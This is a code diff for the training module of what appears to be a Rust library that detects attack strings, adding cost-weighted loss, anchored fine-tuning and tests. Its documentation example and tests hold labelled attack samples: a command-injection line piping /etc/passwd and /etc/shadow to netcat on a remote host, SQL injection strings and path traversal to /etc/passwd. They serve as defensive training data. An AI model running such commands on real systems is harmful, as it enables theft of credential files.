@@ -3,10 +3,11 @@
 use core::fmt;
 use std::thread;
 
+use super::costs::Costs;
 use super::dataset::Dataset;
 use super::math::{Rng, cos, sigmoid};
 use super::network::{self, Adam, Network, Pass, QuantizedWeights, SHARDS, Shard, batch_gradients};
-use super::quantize::quantize;
+use super::quantize::{dequantize, quantize};
 use crate::Category;
 use crate::backend::Verified;
 use crate::fingerprint::FINGERPRINT_LEN;
@@ -29,7 +30,8 @@ use crate::model::{EmbeddedModel, MAX_HIDDEN, MAX_LAYERS, Model, ModelError};
 pub struct TrainConfig {
     /// The number of units of each hidden layer, from the first. At most
     /// three layers of 1 to [`MAX_HIDDEN`] units. Without a hidden layer the
-    /// model is linear.
+    /// model is linear. [Fine-tuning](Trainer::fine_tune) keeps the layers
+    /// of the base model and ignores this setting.
     pub hidden: Vec<usize>,
     /// The number of passes over the data, at least 1.
     pub epochs: u32,
@@ -41,12 +43,18 @@ pub struct TrainConfig {
     pub batch_size: usize,
     /// The step size at the start. It falls to zero along a cosine.
     pub learning_rate: f32,
-    /// The share of each weight that a step of size 1 removes.
+    /// The share of each weight that a step of size 1 removes. When
+    /// [fine-tuning](Trainer::fine_tune), it is the share of the distance
+    /// of each weight to its value in the base model, so that a larger
+    /// value keeps the model closer to the base. Steps are small, so only
+    /// values from about 10 hold a tuned model back noticeably.
     pub weight_decay: f32,
     /// The share of features that are set to zero at random in each window,
     /// from 0.0 to less than 1.0. It makes the model rely on more than a few
     /// features.
     pub input_dropout: f32,
+    /// The cost of false positives and of false negatives in the loss.
+    pub costs: Costs,
     /// The seed of the initial weights, the order of the windows, and the
     /// dropped features.
     pub seed: u64,
@@ -65,6 +73,7 @@ impl Default for TrainConfig {
             learning_rate: 2e-3,
             weight_decay: 1e-4,
             input_dropout: 0.1,
+            costs: Costs::UNIFORM,
             seed: 1,
             threads: 0,
         }
@@ -84,8 +93,34 @@ impl TrainConfig {
             EmbeddedModel::Large => vec![192, 96],
             _ => vec![64, 64],
         };
+        let costs = match model {
+            EmbeddedModel::Strict => Costs::UNIFORM.benign(4.0),
+            _ => Costs::UNIFORM,
+        };
         Self {
             hidden,
+            costs,
+            ..Self::default()
+        }
+    }
+
+    /// Returns settings for [`Trainer::fine_tune`]: six epochs of small
+    /// steps on batches of 64 windows, which round weights and activations
+    /// from the start, without dropped features and without a pull towards
+    /// the base model.
+    ///
+    /// These are a starting point. Compare the tuned model with the base on
+    /// held-out samples of both the text that it should now score
+    /// differently and the text whose scores should stay.
+    #[must_use]
+    pub fn fine_tuning() -> Self {
+        Self {
+            epochs: 6,
+            quantized_epochs: 6,
+            batch_size: 64,
+            learning_rate: 2e-4,
+            weight_decay: 0.0,
+            input_dropout: 0.0,
             ..Self::default()
         }
     }
@@ -120,6 +155,9 @@ impl TrainConfig {
         }
         if !(0.0..1.0).contains(&self.input_dropout) {
             return invalid("input dropout is not within 0.0 to 1.0");
+        }
+        if !self.costs.is_valid() {
+            return invalid("a cost is negative or not finite");
         }
         Ok(())
     }
@@ -179,7 +217,8 @@ pub struct EpochReport {
     /// Whether the epoch rounded weights and activations.
     pub quantized: bool,
     /// The mean loss of the epoch over every window and category: the
-    /// binary cross-entropy of the float network, in nats.
+    /// binary cross-entropy of the float network, in nats, weighted by the
+    /// [costs](TrainConfig::costs) and the weights of the samples.
     pub loss: f64,
 }
 
@@ -331,13 +370,92 @@ impl Trainer {
         dims.push(Category::COUNT);
         let mut rng = Rng::new(self.config.seed);
         let network = Network::random(&mut rng, &dims);
-        self.run(network, data, &rng, progress)
+        self.run(network, None, data, &rng, progress)
     }
 
-    /// Optimizes `network` on `data` and quantizes it.
+    /// Continues the training of `base` on `data`.
+    ///
+    /// The model keeps the layers of `base`, and
+    /// [`hidden`](TrainConfig::hidden) is ignored. Training starts from the
+    /// parameters of `base`. [`TrainConfig::fine_tuning`] returns settings
+    /// to start from.
+    ///
+    /// Use this to correct a model with samples of your own: benign text
+    /// that it flags, and attacks that it misses.
+    ///
+    /// The model moves on every text that shares features with `data`.
+    /// Benign samples alone teach it to score their features low, and
+    /// attacks that share those features are then missed. Add samples whose
+    /// scores must stay as they are, above all attacks of the categories
+    /// that the benign samples were flagged in, and measure both effects on
+    /// held-out samples. A corpus from `tools/train/dataset.py` serves as
+    /// such samples, and `tools/train/README.md` records what tuning with
+    /// and without them did to the embedded model.
+    /// [`weight_decay`](TrainConfig::weight_decay) pulls every weight back
+    /// towards its value in `base`, which limits both effects together and
+    /// does not replace those samples.
+    ///
+    /// ```
+    /// use string2fingerprint::model::Model;
+    /// use string2fingerprint::train::{Dataset, Sample, TrainConfig, Trainer};
+    /// use string2fingerprint::{Category, Scorer};
+    ///
+    /// // Documentation that quotes shell commands, which the embedded
+    /// // model can take for command injection.
+    /// let mut data = Dataset::new();
+    /// for name in ["build", "test", "lint", "bench"] {
+    ///     let text = format!("To {name}, run `make {name} && cat {name}.log | less`.");
+    ///     data.push(Sample::benign(text.as_bytes()).weighted(4.0))?;
+    /// }
+    /// // Attacks that the tuned model must still flag.
+    /// for file in ["passwd", "shadow", "hosts"] {
+    ///     let attack = format!("q=;cat /etc/{file} | nc 10.0.0.1 4444;");
+    ///     data.push(Sample::new(attack.as_bytes(), Category::CommandInjection))?;
+    /// }
+    ///
+    /// let base = Model::embedded();
+    /// let mut config = TrainConfig::fine_tuning();
+    /// config.batch_size = 4;
+    /// let tuned = Trainer::new(config)?.fine_tune(&base, &data)?;
+    ///
+    /// let text = b"To deploy, run `make deploy && cat deploy.log | less`.";
+    /// let before = Scorer::with_model(base).score(text);
+    /// let after = Scorer::with_model(tuned.into_model()).score(text);
+    /// assert!(after.get(Category::CommandInjection) <= before.get(Category::CommandInjection));
+    /// # Ok::<(), Box<dyn std::error::Error>>(())
+    /// ```
+    ///
+    /// # Errors
+    ///
+    /// Returns the errors of [`Trainer::train`].
+    pub fn fine_tune(&self, base: &Model, data: &Dataset) -> Result<Trained, TrainError> {
+        self.fine_tune_with_progress(base, data, |_| {})
+    }
+
+    /// Continues training like [`Trainer::fine_tune`] and calls `progress`
+    /// after each epoch.
+    ///
+    /// # Errors
+    ///
+    /// Returns the errors of [`Trainer::train`].
+    pub fn fine_tune_with_progress(
+        &self,
+        base: &Model,
+        data: &Dataset,
+        progress: impl FnMut(&EpochReport),
+    ) -> Result<Trained, TrainError> {
+        let network = dequantize(base);
+        let anchor = network.clone();
+        let rng = Rng::new(self.config.seed);
+        self.run(network, Some(&anchor), data, &rng, progress)
+    }
+
+    /// Optimizes `network` on `data` and quantizes it. Weights decay towards
+    /// those of `anchor`, or towards zero without one.
     fn run(
         &self,
         mut network: Network,
+        anchor: Option<&Network>,
         data: &Dataset,
         rng: &Rng,
         mut progress: impl FnMut(&EpochReport),
@@ -357,6 +475,9 @@ impl Trainer {
         let total_steps = u64::from(config.epochs) * steps_per_epoch as u64;
 
         let mut adam = Adam::new(&network.dims);
+        if let Some(anchor) = anchor {
+            adam = adam.anchored(anchor);
+        }
         let mut quantized_weights = QuantizedWeights::new(&network.dims);
         let mut shards: Vec<Shard> = (0..SHARDS).map(|_| Shard::new(&network.dims)).collect();
         let mut order: Vec<usize> = (0..windows).collect();
@@ -377,6 +498,7 @@ impl Trainer {
                     position: batch * batch_size,
                     quantized,
                     dropout: config.input_dropout,
+                    costs: &config.costs,
                     rng: &epoch_rng,
                     threads,
                 };
@@ -623,6 +745,16 @@ mod tests {
         for dropout in [-0.1, 1.0, f32::NAN] {
             assert!(invalid(&|config| config.input_dropout = dropout));
         }
+        for cost in [-0.1, f32::NAN, f32::INFINITY] {
+            assert!(invalid(&|config| config.costs = Costs::UNIFORM.benign(cost)));
+            assert!(invalid(
+                &|config| config.costs = Costs::UNIFORM.false_negatives(cost)
+            ));
+        }
+        assert!(!invalid(
+            &|config| config.costs = Costs::UNIFORM.false_positives(0.0)
+        ));
+        assert!(Trainer::new(TrainConfig::fine_tuning()).is_ok());
         assert!(!invalid(
             &|config| config.hidden = vec![MAX_HIDDEN; MAX_LAYERS - 1]
         ));
@@ -665,8 +797,199 @@ mod tests {
                 sizes,
                 "{embedded}"
             );
+            assert_eq!(
+                config.costs.benign_weight(),
+                if embedded == EmbeddedModel::Strict {
+                    4.0
+                } else {
+                    1.0
+                }
+            );
             assert!(Trainer::new(config).is_ok());
         }
+    }
+
+    /// The share of the samples of `data` that `model` scores at least 128
+    /// in `category`, for the samples with and without that label.
+    fn flagged(model: &Model, data: &Dataset, category: Category) -> (f64, f64) {
+        let scorer = Scorer::with_model(model.clone());
+        let confusion = data.evaluate(&scorer).confusion(category, 128.into());
+        (
+            confusion.recall().unwrap(),
+            confusion.false_positive_rate().unwrap(),
+        )
+    }
+
+    #[test]
+    fn costs_trade_false_positives_for_false_negatives() {
+        // Benign and attack strings that overlap, so that the model cannot
+        // separate them and the costs decide where it errs.
+        let mut data = Dataset::new();
+        let mut rng = Rng::new(21);
+        let words = [
+            "select", "union", "from", "where", "order", "users", "name", "table",
+        ];
+        for _ in 0..150 {
+            let mut pick = || words[rng.below(words.len())];
+            let benign = format!("please {} the {} {} my {}", pick(), pick(), pick(), pick());
+            data.push(Sample::benign(benign.as_bytes())).unwrap();
+            let attack = format!("{} {} {} the {} 1=1", pick(), pick(), pick(), pick());
+            data.push(Sample::new(attack.as_bytes(), Category::SqlInjection))
+                .unwrap();
+        }
+        let train = |costs: Costs| {
+            let config = TrainConfig {
+                costs,
+                input_dropout: 0.5,
+                epochs: 6,
+                quantized_epochs: 1,
+                ..config(&[])
+            };
+            let trained = Trainer::new(config).unwrap().train(&data).unwrap();
+            flagged(trained.model(), &data, Category::SqlInjection)
+        };
+        let (recall, false_positives) = train(Costs::UNIFORM);
+        let cautious = train(Costs::UNIFORM.false_positive(Category::SqlInjection, 30.0));
+        let eager = train(Costs::UNIFORM.false_negative(Category::SqlInjection, 30.0));
+        let strict = train(Costs::UNIFORM.benign(30.0));
+        assert!(recall > 0.0 && false_positives < 1.0);
+        assert!(
+            cautious.1 <= false_positives && cautious.0 < recall,
+            "{cautious:?}"
+        );
+        assert!(eager.0 >= recall && eager.1 > false_positives, "{eager:?}");
+        assert_eq!(strict, cautious);
+    }
+
+    #[test]
+    fn a_sample_weight_counts_like_copies_of_the_sample() {
+        let mut copies = Dataset::new();
+        let mut weighted = Dataset::new();
+        for index in 0..20 {
+            let benign = format!("/page/{index}?lang=en");
+            let attack = format!("/page/{index}/../../../etc/passwd");
+            let attack = Sample::new(attack.as_bytes(), Category::PathTraversal);
+            for data in [&mut copies, &mut weighted] {
+                data.push(Sample::benign(benign.as_bytes())).unwrap();
+            }
+            copies.push(attack).unwrap();
+            weighted.push(attack.weighted(0.0)).unwrap();
+        }
+        // A weight of zero removes the attacks from the loss, so the model
+        // never learns the category.
+        let train = |data: &Dataset| {
+            let trained = Trainer::new(config(&[6])).unwrap().train(data).unwrap();
+            flagged(trained.model(), &copies, Category::PathTraversal).0
+        };
+        assert!(train(&copies) > 0.9);
+        assert_eq!(train(&weighted), 0.0);
+    }
+
+    #[test]
+    fn fine_tuning_without_steps_returns_the_base_model() {
+        let data = dataset(10);
+        let base = Trainer::new(config(&[7, 5]))
+            .unwrap()
+            .train(&data)
+            .unwrap()
+            .into_model();
+        // A step size that underflows moves no parameter.
+        let frozen = TrainConfig {
+            learning_rate: 1e-38,
+            weight_decay: 0.0,
+            hidden: vec![99],
+            ..TrainConfig::fine_tuning()
+        };
+        let tuned = Trainer::new(frozen)
+            .unwrap()
+            .fine_tune(&base, &data)
+            .unwrap();
+        assert_eq!(
+            tuned.model().layer_sizes().collect::<Vec<_>>(),
+            [7, 5, Category::COUNT]
+        );
+        for (base, tuned) in base.layers().zip(tuned.model().layers()) {
+            assert_eq!(base.weights, tuned.weights);
+            assert_eq!(base.shift, tuned.shift);
+        }
+        let (base, tuned) = (
+            Scorer::with_model(base),
+            Scorer::with_model(tuned.into_model()),
+        );
+        for ((_, before), (_, after)) in data.scores(&base).zip(data.scores(&tuned)) {
+            for (before, after) in before.as_array().iter().zip(after.as_array()) {
+                assert!(before.abs_diff(*after) <= 2, "{before} and {after}");
+            }
+        }
+    }
+
+    #[test]
+    fn fine_tuning_corrects_a_model_on_new_samples() {
+        let data = dataset(60);
+        let base = Trainer::new(config(&[12]))
+            .unwrap()
+            .train(&data)
+            .unwrap()
+            .into_model();
+
+        // Benign text that the base model has never seen and takes for an
+        // attack, and the attack that it must keep flagging.
+        let mut corrections = Dataset::new();
+        let mut held_out = Dataset::new();
+        let mut rng = Rng::new(31);
+        for index in 0..80 {
+            let number = rng.below(10_000);
+            let benign = format!("note {number}: write ' OR ' between the two UNION members");
+            let sql = format!("item{number}=' OR {number}={number} UNION SELECT name FROM users--");
+            let part = if index % 4 == 0 {
+                &mut held_out
+            } else {
+                &mut corrections
+            };
+            part.push(Sample::benign(benign.as_bytes())).unwrap();
+            part.push(Sample::new(sql.as_bytes(), Category::SqlInjection))
+                .unwrap();
+        }
+        let before = flagged(&base, &held_out, Category::SqlInjection);
+        assert!(
+            before.1 > 0.5,
+            "the base model flags the new benign text: {before:?}"
+        );
+
+        let config = TrainConfig {
+            batch_size: 16,
+            learning_rate: 2e-3,
+            threads: 1,
+            ..TrainConfig::fine_tuning()
+        };
+        let trainer = Trainer::new(config).unwrap();
+        let mut epochs = 0;
+        let tuned = trainer
+            .fine_tune_with_progress(&base, &corrections, |_| epochs += 1)
+            .unwrap();
+        assert_eq!(epochs, 6);
+        assert!(tuned.report().epochs().iter().all(|epoch| epoch.quantized));
+        let after = flagged(tuned.model(), &held_out, Category::SqlInjection);
+        assert!(
+            after.1 < 0.1,
+            "false positives on held-out text: {before:?} to {after:?}"
+        );
+        assert!(
+            after.0 > 0.9,
+            "recall on held-out attacks: {before:?} to {after:?}"
+        );
+
+        // The pull towards the base keeps the scores of the old data.
+        let old = flagged(tuned.model(), &data, Category::PathTraversal);
+        assert!(old.0 > 0.9 && old.1 < 0.1, "{old:?}");
+        assert_eq!(
+            trainer.fine_tune(&base, &corrections).unwrap().model(),
+            tuned.model()
+        );
+        assert_eq!(
+            trainer.fine_tune(&base, &Dataset::new()).err(),
+            Some(TrainError::EmptyDataset)
+        );
     }
 
     #[test]
